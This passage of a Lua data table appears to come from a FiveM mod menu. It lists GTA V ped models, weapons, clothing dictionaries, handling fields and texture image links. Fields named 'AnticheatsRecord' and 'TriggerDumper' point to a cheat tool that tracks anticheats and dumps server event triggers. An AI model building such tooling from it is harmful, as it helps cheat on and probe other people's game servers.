                    '_a_ara', '_b_ara', '_c_ara', '_d_ara', '_e_ara', '_f_ara',
                    '_g_ara', '_h_ara', '_i_ara', '_j_ara', '_k_ara', '_l_ara',
                    '_m_ara', '_n_ara', '_o_ara', '_p_ara', '_q_ara', '_r_ara',
                    '_s_ara', '_t_ara', '_u_ara', '_v_ara', '_w_ara', '_x_ara',
                    '_y_ara', '_z_ara'
                }
            },
            dicts = {
                ['male'] = {
                    'mp_m_freemode_01', 'mp_m_freemode_01_mp_m_airraces_01',
                    'mp_m_freemode_01_male_apt01',
                    'mp_m_freemode_01_mp_m_assault',
                    'mp_m_freemode_01_mp_m_battle',
                    'mp_m_freemode_01_mp_m_bikerdlc_01',
                    'mp_m_freemode_01_male_xmas2',
                    'mp_m_freemode_01_mp_m_christmas2017',
                    'mp_m_freemode_01_mp_m_christmas2018',
                    'mp_m_freemode_01_mp_m_executive_01',
                    'mp_m_freemode_01_mp_m_gunrunning_01',
                    'mp_m_freemode_01_male_freemode_halloween',
                    'mp_m_freemode_01_male_heist',
                    'mp_m_freemode_01_mp_m_heist3',
                    'mp_m_freemode_01_mp_m_heist4',
                    'mp_m_freemode_01_mp_m_importexport_01',
                    'mp_m_freemode_01_mp_m_january2016',
                    'mp_m_freemode_01_mp_m_lowrider_01',
                    'mp_m_freemode_01_mp_m_lowrider_02',
                    'mp_m_freemode_01_mp_m_luxe_01',
                    'mp_m_freemode_01_mp_m_luxe_02',
                    'mp_m_freemode_01_male_freemode_beach',
                    'mp_m_freemode_01_male_freemode_business',
                    'mp_m_freemode_01_male_freemode_hipster',
                    'mp_m_freemode_01_male_freemode_independence',
                    'mp_m_freemode_01_male_freemode_mplts',
                    'mp_m_freemode_01_mp_m_htb_01',
                    'mp_m_freemode_01_mp_m_smuggler_01',
                    'mp_m_freemode_01_mp_m_stunt_01',
                    'mp_m_freemode_01_mp_m_sum',
                    'mp_m_freemode_01_mp_m_valentines_02',
                    'mp_m_freemode_01_mp_m_vinewood',
                    'mp_m_freemode_01_mp_m_xmas_03',
                    'mp_m_freemode_01_male_freemode_pilot',
                    'mp_m_freemode_01_male_freemode_business2',
                    'mp_m_freemode_01_male_xmas',
                    'mp_m_freemode_01_male_freemode_valentines'
                },
                ['female'] = {
                    'mp_f_freemode_01', 'mp_f_freemode_01_mp_m_airraces_01',
                    'mp_f_freemode_01_male_apt01',
                    'mp_f_freemode_01_mp_m_assault',
                    'mp_f_freemode_01_mp_m_battle',
                    'mp_f_freemode_01_mp_m_bikerdlc_01',
                    'mp_f_freemode_01_male_xmas2',
                    'mp_f_freemode_01_mp_m_christmas2017',
                    'mp_f_freemode_01_mp_m_christmas2018',
                    'mp_f_freemode_01_mp_m_executive_01',
                    'mp_f_freemode_01_mp_m_gunrunning_01',
                    'mp_f_freemode_01_male_freemode_halloween',
                    'mp_f_freemode_01_male_heist',
                    'mp_f_freemode_01_mp_m_heist3',
                    'mp_f_freemode_01_mp_m_heist4',
                    'mp_f_freemode_01_mp_m_importexport_01',
                    'mp_f_freemode_01_mp_m_january2016',
                    'mp_f_freemode_01_mp_m_lowrider_01',
                    'mp_f_freemode_01_mp_m_lowrider_02',
                    'mp_f_freemode_01_mp_m_luxe_01',
                    'mp_f_freemode_01_mp_m_luxe_02',
                    'mp_f_freemode_01_male_freemode_beach',
                    'mp_f_freemode_01_male_freemode_business',
                    'mp_f_freemode_01_male_freemode_hipster',
                    'mp_f_freemode_01_male_freemode_independence',
                    'mp_f_freemode_01_male_freemode_mplts',
                    'mp_f_freemode_01_mp_m_htb_01',
                    'mp_f_freemode_01_mp_m_smuggler_01',
                    'mp_f_freemode_01_mp_m_stunt_01',
                    'mp_f_freemode_01_mp_m_sum',
                    'mp_f_freemode_01_mp_m_valentines_02',
                    'mp_f_freemode_01_mp_m_vinewood',
                    'mp_f_freemode_01_mp_m_xmas_03',
                    'mp_f_freemode_01_male_freemode_pilot',
                    'mp_f_freemode_01_male_freemode_business2',
                    'mp_f_freemode_01_male_xmas',
                    'mp_f_freemode_01_male_freemode_valentines'
                }
            },
            textures = {
                labels = {
                    'white', 'black', 'blue', 'cyan', 'dark pink',
                    'dark purple', 'dark red', 'grey', 'green', 'orange',
                    'pink', 'red', 'yellow', 'fluid (anim)', 'damascus',
                    'flower (anim)', 'Digital (anim)',
                    'Digital inverted (anim)', 'Damascus (anim)',
                    'Red waves (anim)'
                },
                links = {
                    'https://cdn.upload.systems/uploads/axK5QgN3.png',
                    'https://cdn.upload.systems/uploads/d0Uf5Yt9.png',
                    'https://cdn.upload.systems/uploads/8C79KNGM.png',
                    'https://cdn.upload.systems/uploads/hJ0O6Z8D.png',
                    'https://cdn.upload.systems/uploads/VyfTSIH0.png',
                    'https://cdn.upload.systems/uploads/oxonrrN2.png',
                    'https://cdn.upload.systems/uploads/jBa6IcWp.png',
                    'https://cdn.upload.systems/uploads/zc5AJMEn.png',
                    'https://cdn.upload.systems/uploads/ZWg8awFJ.png',
                    'https://cdn.upload.systems/uploads/oNpg9Mn1.png',
                    'https://cdn.upload.systems/uploads/ufCXOwha.png',
                    'https://cdn.upload.systems/uploads/1IVIf3BC.png',
                    'https://cdn.upload.systems/uploads/5yNzcUs4.png',
                    'https://cdn.upload.systems/uploads/d2gGwa5Q.gif',
                    'https://cdn.upload.systems/uploads/5W6i2Z6Q.png',
                    'https://cdn.upload.systems/uploads/dhLWUDBy.gif',
                    'https://cdn.upload.systems/uploads/WEE3JlIT.gif',
                    'https://cdn.upload.systems/uploads/gRnJ97yK.gif',
                    'https://cdn.upload.systems/uploads/r6q1EEvg.gif',
                    'https://cdn.upload.systems/uploads/ThL5W99n.gif'
                }
            },
            weapons = {
                'w_lr_grenadelauncher_s', 'w_am_baseball', 'w_am_brfcase',
                'w_am_case', 'w_am_digiscanner', 'w_am_fire_exting+hi',
                'w_am_fire_exting', 'w_am_flare', 'w_am_jerrycan+hi',
                'w_am_jerrycan', 'w_ar_advancedrifle',
                'w_ar_advancedrifle_mag1+hi', 'w_ar_advancedrifle_mag1',
                'w_ar_advancedrifle_mag2+hi', 'w_ar_advancedrifle_mag2',
                'w_ar_assaultrifle', 'w_ar_assaultrifle_mag1',
                'w_ar_assaultrifle_mag2', 'w_ar_carbinerifle',
                'w_ar_carbinerifle_mag1', 'w_ar_carbinerifle_mag2',
                'w_at_ar_afgrip', 'w_at_ar_flsh', 'w_at_ar_supp',
                'w_at_ar_supp_02', 'w_at_assaultrifle_cam', 'w_at_pi_flsh',
                'w_at_pi_supp', 'w_at_pi_supp_2', 'w_at_railcover_01',
                'w_at_scope_large', 'w_at_scope_macro', 'w_at_scope_macro_2',
                'w_at_scope_max', 'w_at_scope_medium', 'w_at_scope_small',
                'w_at_scope_small_2', 'w_at_sr_supp', 'w_at_sr_supp_2',
                'w_ex_birdshat', 'w_ex_grenadefrag', 'w_ex_grenadesmoke',
                'w_ex_molotov', 'w_ex_pe+hi', 'w_ex_pe', 'w_lr_40mm',
                'w_lr_grenadelauncher', 'w_lr_rpg+hi', 'w_lr_rpg',
                'w_lr_rpg_l1_new', 'w_lr_rpg_rocket', 'w_me_bat',
                'w_me_crowbar', 'w_me_gclub', 'w_me_hammer', 'w_me_knife_01',
                'w_me_nightstick', 'w_mg_combatmg+hi', 'w_mg_combatmg',
                'w_mg_combatmg_mag1', 'w_mg_combatmg_mag2', 'w_mg_mg',
                'w_mg_mg_mag1', 'w_mg_mg_mag2', 'w_mg_minigun+hi',
                'w_mg_minigun', 'w_pi_appistol', 'w_pi_appistol_mag1',
                'w_pi_appistol_mag2', 'w_pi_combatpistol',
                'w_pi_combatpistol_mag1', 'w_pi_combatpistol_mag2',
                'w_pi_pistol', 'w_pi_pistol50', 'w_pi_pistol50_mag1',
                'w_pi_pistol50_mag2', 'w_pi_pistol_mag1', 'w_pi_pistol_mag2',
                'w_pi_stungun', 'w_sb_assaultsmg+hi', 'w_sb_assaultsmg',
                'w_sb_assaultsmg_mag1', 'w_sb_assaultsmg_mag2', 'w_sb_microsmg',
                'w_sb_microsmg_mag1+hi', 'w_sb_microsmg_mag1',
                'w_sb_microsmg_mag2+hi', 'w_sb_microsmg_mag2', 'w_sb_smg',
                'w_sb_smg_mag1', 'w_sb_smg_mag2', 'w_sg_assaultshotgun',
                'w_sg_assaultshotgun_mag1', 'w_sg_assaultshotgun_mag2',
                'w_sg_bullpupshotgun', 'w_sg_pumpshotgun', 'w_sg_sawnoff+hi',
                'w_sg_sawnoff', 'w_sr_heavysniper', 'w_sr_heavysniper_mag1',
                'w_sr_sniperrifle', 'w_sr_sniperrifle_mag1'
            }
        },
        AnticheatsRecord = {},
        TriggerDumper = {NR = 0, DR = {}, sResource = 'mapmanager'},
        ForceFieldData = {radius = 1, strength = 1},
        HandlingList = {
            'fInitialDragCoeff', 'fPercentSubmerged', 'vecCentreOfMassOffset',
            'vecInertiaMultiplier', 'fDriveBiasFront', 'fDriveBiasBack',
            'nInitialDriveGears', 'fInitialDriveForce', 'fDriveInertia',
            'fClutchChangeRateScaleUpShift', 'fClutchChangeRateScaleDownShift',
            'fInitialDriveMaxFlatVel', 'fBrakeForce', 'fBrakeBiasFront',
            'fHandBrakeForce', 'fSteeringLock', 'fTractionCurveMax',
            'fTractionCurveMin', 'fTractionCurveLateral',
            'fTractionSpringDeltaMax', 'fLowSpeedTractionLossMult',
            'fCamberStiffnesss', 'fTractionBiasFront', 'fTractionLossMult',
            'fSuspensionForce', 'fSuspensionCompDamp', 'fSuspensionReboundDamp',
            'fSuspensionUpperLimit', 'fSuspensionLowerLimit',
            'fSuspensionRaise', 'fSuspensionBiasFront', 'fAntiRollBarForce',
            'fAntiRollBarBiasFront', 'fRollCentreHeightFront',
            'fRollCentreHeightRear', 'fCollisionDamageMult',
            'fWeaponDamageMult', 'fDeformationDamageMult', 'fEngineDamageMult',
            'fPetrolTankVolume', 'fOilVolume', 'fSeatOffsetDistX',
            'fSeatOffsetDistY', 'fSeatOffsetDistZ', 'nMonetaryValue'
        },
        PedModels = {
            {
                'Ambient Female', {
                    'a_f_m_beach_01', 'a_f_m_bevhills_01', 'a_f_m_bevhills_02',
                    'a_f_m_bodybuild_01', 'a_f_m_business_02',
                    'a_f_m_downtown_01', 'a_f_m_eastsa_01', 'a_f_m_eastsa_02',
                    'a_f_m_fatbla_01', 'a_f_m_fatcult_01', 'a_f_m_fatwhite_01',
                    'a_f_m_ktown_01', 'a_f_m_ktown_02', 'a_f_m_prolhost_01',
                    'a_f_m_salton_01', 'a_f_m_skidrow_01', 'a_f_m_soucent_01',
                    'a_f_m_soucent_02', 'a_f_m_soucentmc_01',
                    'a_f_m_tourist_01', 'a_f_m_tramp_01', 'a_f_m_trampbeac_01',
                    'a_f_o_genstreet_01', 'a_f_o_indian_01', 'a_f_o_ktown_01',
                    'a_f_o_salton_01', 'a_f_o_soucent_01', 'a_f_o_soucent_02',
                    'a_f_y_beach_01', 'a_f_y_bevhills_01', 'a_f_y_bevhills_02',
                    'a_f_y_bevhills_03', 'a_f_y_bevhills_04',
                    'a_f_y_business_01', 'a_f_y_business_02',
                    'a_f_y_business_03', 'a_f_y_business_04',
                    'a_f_y_clubcust_01', 'a_f_y_clubcust_02',
                    'a_f_y_clubcust_03', 'a_f_y_eastsa_01', 'a_f_y_eastsa_02',
                    'a_f_y_eastsa_03', 'a_f_y_epsilon_01', 'a_f_y_femaleagent',
                    'a_f_y_fitness_01', 'a_f_y_fitness_02', 'a_f_y_genhot_01',
                    'a_f_y_golfer_01', 'a_f_y_hiker_01', 'a_f_y_hippie_01',
                    'a_f_y_hipster_01', 'a_f_y_hipster_02', 'a_f_y_hipster_03',
                    'a_f_y_hipster_04', 'a_f_y_indian_01', 'a_f_y_juggalo_01',
                    'a_f_y_runner_01', 'a_f_y_rurmeth_01', 'a_f_y_scdressy_01',
                    'a_f_y_skater_01', 'a_f_y_soucent_01', 'a_f_y_soucent_02',
                    'a_f_y_soucent_03', 'a_f_y_tennis_01', 'a_f_y_topless_01',
                    'a_f_y_tourist_01', 'a_f_y_tourist_02', 'a_f_y_vinewood_01',
                    'a_f_y_vinewood_02', 'a_f_y_vinewood_03',
                    'a_f_y_vinewood_04', 'a_f_y_yoga_01', 'a_f_y_gencaspat_01',
                    'a_f_y_smartcaspat_01'
                }
            }, {
                'Ambient Male', {
                    'a_m_m_acult_01', 'a_m_m_afriamer_01', 'a_m_m_beach_01',
                    'a_m_m_beach_02', 'a_m_m_bevhills_01', 'a_m_m_bevhills_02',
                    'a_m_m_business_01', 'a_m_m_eastsa_01', 'a_m_m_eastsa_02',
                    'a_m_m_farmer_01', 'a_m_m_fatlatin_01', 'a_m_m_genfat_01',
                    'a_m_m_genfat_02', 'a_m_m_golfer_01', 'a_m_m_hasjew_01',
                    'a_m_m_hillbilly_01', 'a_m_m_hillbilly_02',
                    'a_m_m_indian_01', 'a_m_m_ktown_01', 'a_m_m_malibu_01',
                    'a_m_m_mexcntry_01', 'a_m_m_mexlabor_01',
                    'a_m_m_og_boss_01', 'a_m_m_paparazzi_01',
                    'a_m_m_polynesian_01', 'a_m_m_prolhost_01',
                    'a_m_m_rurmeth_01', 'a_m_m_salton_01', 'a_m_m_salton_02',
                    'a_m_m_salton_03', 'a_m_m_salton_04', 'a_m_m_skater_01',
                    'a_m_m_skidrow_01', 'a_m_m_socenlat_01', 'a_m_m_soucent_01',
                    'a_m_m_soucent_02', 'a_m_m_soucent_03', 'a_m_m_soucent_04',
                    'a_m_m_stlat_02', 'a_m_m_tennis_01', 'a_m_m_tourist_01',
                    'a_m_m_tramp_01', 'a_m_m_trampbeac_01', 'a_m_m_tranvest_01',
                    'a_m_m_tranvest_02', 'a_m_o_acult_01', 'a_m_o_acult_02',
                    'a_m_o_beach_01', 'a_m_o_genstreet_01', 'a_m_o_ktown_01',
                    'a_m_o_salton_01', 'a_m_o_soucent_01', 'a_m_o_soucent_02',
                    'a_m_o_soucent_03', 'a_m_o_tramp_01', 'a_m_y_acult_01',
                    'a_m_y_acult_02', 'a_m_y_beach_01', 'a_m_y_beach_02',
                    'a_m_y_beach_03', 'a_m_y_beachvesp_01',
                    'a_m_y_beachvesp_02', 'a_m_y_bevhills_01',
                    'a_m_y_bevhills_02', 'a_m_y_breakdance_01',
                    'a_m_y_busicas_01', 'a_m_y_business_01',
                    'a_m_y_business_02', 'a_m_y_business_03',
                    'a_m_y_clubcust_01', 'a_m_y_clubcust_02',
                    'a_m_y_clubcust_03', 'a_m_y_cyclist_01', 'a_m_y_dhill_01',
                    'a_m_y_downtown_01', 'a_m_y_eastsa_01', 'a_m_y_eastsa_02',
                    'a_m_y_epsilon_01', 'a_m_y_epsilon_02', 'a_m_y_gay_01',
                    'a_m_y_gay_02', 'a_m_y_genstreet_01', 'a_m_y_genstreet_02',
                    'a_m_y_golfer_01', 'a_m_y_hasjew_01', 'a_m_y_hiker_01',
                    'a_m_y_hippy_01', 'a_m_y_hipster_01', 'a_m_y_hipster_02',
                    'a_m_y_hipster_03', 'a_m_y_indian_01', 'a_m_y_jetski_01',
                    'a_m_y_juggalo_01', 'a_m_y_ktown_01', 'a_m_y_ktown_02',
                    'a_m_y_latino_01', 'a_m_y_methhead_01', 'a_m_y_mexthug_01',
                    'a_m_y_motox_01', 'a_m_y_motox_02', 'a_m_y_musclbeac_01',
                    'a_m_y_musclbeac_02', 'a_m_y_polynesian_01',
                    'a_m_y_roadcyc_01', 'a_m_y_runner_01', 'a_m_y_runner_02',
                    'a_m_y_salton_01', 'a_m_y_skater_01', 'a_m_y_skater_02',
                    'a_m_y_soucent_01', 'a_m_y_soucent_02', 'a_m_y_soucent_03',
                    'a_m_y_soucent_04', 'a_m_y_stbla_01', 'a_m_y_stbla_02',
                    'a_m_y_stlat_01', 'a_m_y_stwhi_01', 'a_m_y_stwhi_02',
                    'a_m_y_sunbathe_01', 'a_m_y_surfer_01',
                    'a_m_y_vindouche_01', 'a_m_y_vinewood_01',
                    'a_m_y_vinewood_02', 'a_m_y_vinewood_03',
                    'a_m_y_vinewood_04', 'a_m_y_yoga_01', 'a_m_m_mlcrisis_01',
                    'a_m_y_gencaspat_01', 'a_m_y_smartcaspat_01'
                }
            }, {
                'Animals', {
                    'a_c_boar', 'a_c_cat_01', 'a_c_chickenhawk', 'a_c_chimp',
                    'a_c_chop', 'a_c_cormorant', 'a_c_cow', 'a_c_coyote',
                    'a_c_crow', 'a_c_deer', 'a_c_dolphin', 'a_c_fish',
                    'a_c_hen', 'a_c_humpback', 'a_c_husky', 'a_c_killerwhale',
                    'a_c_mtlion', 'a_c_pig', 'a_c_pigeon', 'a_c_poodle',
                    'a_c_pug', 'a_c_rabbit_01', 'a_c_rat', 'a_c_retriever',
                    'a_c_rhesus', 'a_c_rottweiler', 'a_c_seagull',
                    'a_c_sharkhammer', 'a_c_sharktiger', 'a_c_shepherd',
                    'a_c_stingray', 'a_c_westy'
                }
            }, {
                'Cutscene', {
                    'cs_amandatownley', 'cs_andreas', 'cs_ashley', 'cs_bankman',
                    'cs_barry', 'cs_beverly', 'cs_brad', 'cs_bradcadaver',
                    'cs_carbuyer', 'cs_casey', 'cs_chengsr', 'cs_chrisformage',
                    'cs_clay', 'cs_dale', 'cs_davenorton', 'cs_debra',
                    'cs_denise', 'cs_devin', 'cs_dom', 'cs_dreyfuss',
                    'cs_drfriedlander', 'cs_fabien', 'cs_fbisuit_01',
                    'cs_floyd', 'cs_guadalope', 'cs_gurk', 'cs_hunter',
                    'cs_janet', 'cs_jewelass', 'cs_jimmyboston',
                    'cs_jimmydisanto', 'cs_joeminuteman', 'cs_johnnyklebitz',
                    'cs_josef', 'cs_josh', 'cs_karen_daniels', 'cs_lamardavis',
                    'cs_lazlow', 'cs_lazlow_2', 'cs_lestercrest',
                    'cs_lifeinvad_01', 'cs_magenta', 'cs_manuel', 'cs_marnie',
                    'cs_martinmadrazo', 'cs_maryann', 'cs_michelle',
                    'cs_milton', 'cs_molly', 'cs_movpremf_01', 'cs_movpremmale',
                    'cs_mrk', 'cs_mrs_thornhill', 'cs_mrsphillips',
                    'cs_natalia', 'cs_nervousron', 'cs_nigel', 'cs_old_man1a',
                    'cs_old_man2', 'cs_omega', 'cs_orleans', 'cs_paper',
                    'cs_patricia', 'cs_priest', 'cs_prolsec_02',
                    'cs_russiandrunk', 'cs_siemonyetarian', 'cs_solomon',
                    'cs_stevehains', 'cs_stretch', 'cs_tanisha', 'cs_taocheng',
                    'cs_taostranslator', 'cs_tenniscoach', 'cs_terry', 'cs_tom',
                    'cs_tomepsilon', 'cs_tracydisanto', 'cs_wade', 'cs_zimbor',
                    'csb_abigail', 'csb_agent', 'csb_alan', 'csb_anita',
                    'csb_anton', 'csb_avon', 'csb_ballasog', 'csb_bogdan',
                    'csb_bride', 'csb_bryony', 'csb_burgerdrug', 'csb_car3guy1',
                    'csb_car3guy2', 'csb_chef', 'csb_chef2', 'csb_chin_goon',
                    'csb_cletus', 'csb_cop', 'csb_customer',
                    'csb_denise_friend', 'csb_dix', 'csb_djblamadon',
                    'csb_englishdave', 'csb_fos_rep', 'csb_g', 'csb_groom',
                    'csb_grove_str_dlr', 'csb_hao', 'csb_hugh', 'csb_imran',
                    'csb_jackhowitzer', 'csb_janitor', 'csb_maude', 'csb_money',
                    'csb_mp_agent14', 'csb_mrs_r', 'csb_mweather', 'csb_ortega',
                    'csb_oscar', 'csb_paige', 'csb_popov', 'csb_porndudes',
                    'csb_prologuedriver', 'csb_prolsec', 'csb_ramp_gang',
                    'csb_ramp_hic', 'csb_ramp_hipster', 'csb_ramp_marine',
                    'csb_ramp_mex', 'csb_rashcosvki', 'csb_reporter',
                    'csb_roccopelosi', 'csb_screen_writer', 'csb_sol',
                    'csb_stripper_01', 'csb_stripper_02', 'csb_talcc',
                    'csb_talmm', 'csb_tonya', 'csb_tonyprince',
                    'csb_trafficwarden', 'csb_undercover', 'csb_vagspeak',
                    'csb_agatha', 'csb_avery', 'csb_brucie2', 'csb_thornton',
                    'csb_tomcasino', 'csb_vincent'
                }
            }, {
                'Gang Female', {
                    'g_f_importexport_01', 'g_f_y_ballas_01',
                    'g_f_y_families_01', 'g_f_y_lost_01', 'g_f_y_vagos_01'
                }
            }, {
                'Gang Male', {
                    'g_m_importexport_01', 'g_m_m_armboss_01',
                    'g_m_m_armgoon_01', 'g_m_m_armlieut_01',
                    'g_m_m_chemwork_01', 'g_m_m_chiboss_01', 'g_m_m_chicold_01',
                    'g_m_m_chigoon_01', 'g_m_m_chigoon_02', 'g_m_m_korboss_01',
                    'g_m_m_mexboss_01', 'g_m_m_mexboss_02', 'g_m_y_armgoon_02',
                    'g_m_y_azteca_01', 'g_m_y_ballaeast_01',
                    'g_m_y_ballaorig_01', 'g_m_y_ballasout_01',
                    'g_m_y_famca_01', 'g_m_y_famdnf_01', 'g_m_y_famfor_01',
                    'g_m_y_korean_01', 'g_m_y_korean_02', 'g_m_y_korlieut_01',
                    'g_m_y_lost_01', 'g_m_y_lost_02', 'g_m_y_lost_03',
                    'g_m_y_mexgang_01', 'g_m_y_mexgoon_01', 'g_m_y_mexgoon_02',
                    'g_m_y_mexgoon_03', 'g_m_y_pologoon_01',
                    'g_m_y_pologoon_02', 'g_m_y_salvaboss_01',
                    'g_m_y_salvagoon_01', 'g_m_y_salvagoon_02',
                    'g_m_y_salvagoon_03', 'g_m_y_strpunk_01',
                    'g_m_y_strpunk_02', 'g_m_m_casrn_01'
                }
            }, {
                'Multiplayer', {
                    'mp_f_bennymech_01', 'mp_f_boatstaff_01',
                    'mp_f_cardesign_01', 'mp_f_chbar_01', 'mp_f_cocaine_01',
                    'mp_f_counterfeit_01', 'mp_f_deadhooker', 'mp_f_execpa_01',
                    'mp_f_execpa_02', 'mp_f_forgery_01', 'mp_f_freemode_01',
                    'mp_f_helistaff_01', 'mp_f_meth_01', 'mp_f_misty_01',
                    'mp_f_stripperlite', 'mp_f_weed_01', 'mp_g_m_pros_01',
                    'mp_m_avongoon', 'mp_m_boatstaff_01', 'mp_m_bogdangoon',
                    'mp_m_claude_01', 'mp_m_cocaine_01', 'mp_m_counterfeit_01',
                    'mp_m_exarmy_01', 'mp_m_execpa_01', 'mp_m_famdd_01',
                    'mp_m_fibsec_01', 'mp_m_forgery_01', 'mp_m_freemode_01',
                    'mp_m_g_vagfun_01', 'mp_m_freemode_01', 'mp_m_meth_01',
                    'mp_m_niko_01', 'mp_m_securoguard_01', 'mp_m_shopkeep_01',
                    'mp_m_waremech_01', 'mp_m_weapexp_01', 'mp_m_weapwork_01',
                    'mp_m_weed_01', 'mp_s_m_armoured_01'
                }
            }, {
                'Scenario Female', {
                    's_f_m_fembarber', 's_f_m_fembarber', 's_f_m_maid_01',
                    's_f_m_maid_01', 's_f_m_shop_high', 's_f_m_shop_high',
                    's_f_m_sweatshop_01', 's_f_m_sweatshop_01',
                    's_f_y_airhostess_01', 's_f_y_airhostess_01',
                    's_f_y_bartender_01', 's_f_y_bartender_01',
                    's_f_y_baywatch_01', 's_f_y_baywatch_01',
                    's_f_y_clubbar_01', 's_f_y_clubbar_01', 's_f_y_cop_01',
                    's_f_y_cop_01', 's_f_y_factory_01', 's_f_y_factory_01',
                    's_f_y_hooker_01', 's_f_y_hooker_01', 's_f_y_hooker_02',
                    's_f_y_hooker_02', 's_f_y_hooker_03', 's_f_y_hooker_03',
                    's_f_y_migrant_01', 's_f_y_migrant_01', 's_f_y_movprem_01',
                    's_f_y_movprem_01', 's_f_y_ranger_01', 's_f_y_ranger_01',
                    's_f_y_scrubs_01', 's_f_y_scrubs_01', 's_f_y_sheriff_01',
                    's_f_y_sheriff_01', 's_f_y_shop_low', 's_f_y_shop_low',
                    's_f_y_shop_mid', 's_f_y_shop_mid', 's_f_y_stripper_01',
                    's_f_y_stripper_01', 's_f_y_stripper_02',
                    's_f_y_stripper_02', 's_f_y_stripperlite',
                    's_f_y_stripperlite', 's_f_y_sweatshop_01',
                    's_f_y_sweatshop_01'
                }
            }, {
                'Scenario Male', {
                    's_m_m_ammucountry', 's_m_m_armoured_01',
                    's_m_m_armoured_02', 's_m_m_autoshop_01',
                    's_m_m_autoshop_02', 's_m_m_bouncer_01', 's_m_m_ccrew_01',
                    's_m_m_chemsec_01', 's_m_m_ciasec_01', 's_m_m_cntrybar_01',
                    's_m_m_dockwork_01', 's_m_m_doctor_01',
                    's_m_m_fiboffice_01', 's_m_m_fiboffice_02',
                    's_m_m_fibsec_01', 's_m_m_gaffer_01', 's_m_m_gardener_01',
                    's_m_m_gentransport', 's_m_m_hairdress_01',
                    's_m_m_highsec_01', 's_m_m_highsec_02', 's_m_m_janitor',
                    's_m_m_lathandy_01', 's_m_m_lifeinvad_01', 's_m_m_linecook',
                    's_m_m_lsmetro_01', 's_m_m_mariachi_01', 's_m_m_marine_01',
                    's_m_m_marine_02', 's_m_m_migrant_01', 's_m_m_movalien_01',
                    's_m_m_movprem_01', 's_m_m_movspace_01',
                    's_m_m_paramedic_01', 's_m_m_pilot_01', 's_m_m_pilot_02',
                    's_m_m_postal_01', 's_m_m_postal_02', 's_m_m_prisguard_01',
                    's_m_m_scientist_01', 's_m_m_security_01',
                    's_m_m_snowcop_01', 's_m_m_strperf_01',
                    's_m_m_strpreach_01', 's_m_m_strvend_01',
                    's_m_m_trucker_01', 's_m_m_ups_01', 's_m_m_ups_02',
                    's_m_o_busker_01', 's_m_y_airworker', 's_m_y_ammucity_01',
                    's_m_y_armymech_01', 's_m_y_autopsy_01', 's_m_y_barman_01',
                    's_m_y_baywatch_01', 's_m_y_blackops_01',
                    's_m_y_blackops_02', 's_m_y_blackops_03', 's_m_y_busboy_01',
                    's_m_y_chef_01', 's_m_y_clown_01', 's_m_y_clubbar_01',
                    's_m_y_construct_01', 's_m_y_construct_02', 's_m_y_cop_01',
                    's_m_y_dealer_01', 's_m_y_devinsec_01', 's_m_y_dockwork_01',
                    's_m_y_doorman_01', 's_m_y_dwservice_01',
                    's_m_y_dwservice_02', 's_m_y_factory_01',
                    's_m_y_fireman_01', 's_m_y_garbage', 's_m_y_grip_01',
                    's_m_y_hwaycop_01', 's_m_y_marine_01', 's_m_y_marine_02',
                    's_m_y_marine_03', 's_m_y_mime', 's_m_y_pestcont_01',
                    's_m_y_pilot_01', 's_m_y_prismuscl_01', 's_m_y_prisoner_01',
                    's_m_y_ranger_01', 's_m_y_robber_01', 's_m_y_sheriff_01',
                    's_m_y_shop_mask', 's_m_y_strvend_01', 's_m_y_swat_01',
                    's_m_y_uscg_01', 's_m_y_valet_01', 's_m_y_waiter_01',
                    's_m_y_waretech_01', 's_m_y_winclean_01', 's_m_y_xmech_01',
                    's_m_y_xmech_02', 's_m_y_casino_01', 's_m_y_westsec_01'
                }
            }, {
                'Story', {
                    'hc_driver', 'hc_gunman', 'hc_hacker', 'ig_abigail',
                    'ig_agent', 'ig_amandatownley', 'ig_andreas', 'ig_ashley',
                    'ig_avon', 'ig_ballasog', 'ig_bankman', 'ig_barry',
                    'ig_benny', 'ig_bestmen', 'ig_beverly', 'ig_brad',
                    'ig_bride', 'ig_car3guy1', 'ig_car3guy2', 'ig_casey',
                    'ig_chef', 'ig_chef2', 'ig_chengsr', 'ig_chrisformage',
                    'ig_clay', 'ig_claypain', 'ig_cletus', 'ig_dale',
                    'ig_davenorton', 'ig_denise', 'ig_devin', 'ig_dix',
                    'ig_djblamadon', 'ig_djblamrupert', 'ig_djblamryans',
                    'ig_djdixmanager', 'ig_djgeneric_01', 'ig_djsolfotios',
                    'ig_djsoljakob', 'ig_djsolmanager', 'ig_djsolmike',
                    'ig_djsolrobt', 'ig_djtalaurelia', 'ig_djtalignazio',
                    'ig_dom', 'ig_dreyfuss', 'ig_drfriedlander',
                    'ig_englishdave', 'ig_fabien', 'ig_fbisuit_01', 'ig_floyd',
                    'ig_g', 'ig_groom', 'ig_hao', 'ig_hunter', 'ig_janet',
                    'ig_jay_norris', 'ig_jewelass', 'ig_jimmyboston',
                    'ig_jimmyboston_02', 'ig_jimmydisanto', 'ig_joeminuteman',
                    'ig_johnnyklebitz', 'ig_josef', 'ig_josh',
                    'ig_karen_daniels', 'ig_kerrymcintosh',
                    'ig_kerrymcintosh_02', 'ig_lacey_jones_02', 'ig_lamardavis',
                    'ig_lazlow', 'ig_lazlow_2', 'ig_lestercrest',
                    'ig_lestercrest_2', 'ig_lifeinvad_01', 'ig_lifeinvad_02',
                    'ig_magenta', 'ig_malc', 'ig_manuel', 'ig_marnie',
                    'ig_maryann', 'ig_maude', 'ig_michelle', 'ig_milton',
                    'ig_molly', 'ig_money', 'ig_mp_agent14', 'ig_mrk',
                    'ig_mrs_thornhill', 'ig_mrsphillips', 'ig_natalia',
                    'ig_nervousron', 'ig_nigel', 'ig_old_man1a', 'ig_old_man2',
                    'ig_omega', 'ig_oneil', 'ig_orleans', 'ig_ortega',
                    'ig_paige', 'ig_paper', 'ig_patricia', 'ig_popov',
                    'ig_priest', 'ig_prolsec_02', 'ig_ramp_gang', 'ig_ramp_hic',
                    'ig_ramp_hipster', 'ig_ramp_mex', 'ig_rashcosvki',
                    'ig_roccopelosi', 'ig_russiandrunk', 'ig_sacha',
                    'ig_screen_writer', 'ig_siemonyetarian', 'ig_sol',
                    'ig_solomon', 'ig_stevehains', 'ig_stretch', 'ig_talcc',
                    'ig_talina', 'ig_talmm', 'ig_tanisha', 'ig_taocheng',
                    'ig_taostranslator', 'ig_tenniscoach', 'ig_terry',
                    'ig_tomepsilon', 'ig_tonya', 'ig_tonyprince',
                    'ig_tracydisanto', 'ig_trafficwarden', 'ig_tylerdix',
                    'ig_tylerdix_02', 'ig_vagspeak', 'ig_wade', 'ig_zimbor',
                    'player_one', 'player_two', 'player_zero', 'ig_agatha',
